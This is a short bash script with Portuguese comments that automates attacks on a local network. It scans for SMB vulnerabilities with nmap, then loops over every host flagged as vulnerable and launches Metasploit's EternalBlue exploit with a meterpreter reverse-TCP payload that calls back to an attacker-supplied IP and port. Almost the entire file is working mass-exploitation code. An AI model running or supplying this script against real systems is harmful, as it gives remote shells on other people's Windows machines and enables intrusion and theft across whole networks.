#!/bin/bash

# Define o endereço IP da rede a ser testada
NETWORK="192.168.1.0/24"

# Varre a rede em busca de sistemas online e portas abertas, identificando possíveis vulnerabilidades SMB
nmap -p 139,445 --script smb-vuln* -T4 $NETWORK -oN smb-results.txt

# Analisa o arquivo de resultados do Nmap e identifica os sistemas vulneráveis
grep "VULNERABLE" smb-results.txt | awk '{print $2}' > vulnerable-systems.txt

# Executa o exploit em cada um dos sistemas vulneráveis
while read system; do
  echo "Testing system $system"
  msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $system; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <your-ip>; set LPORT <your-port>; run"
done < vulnerable-systems.txt
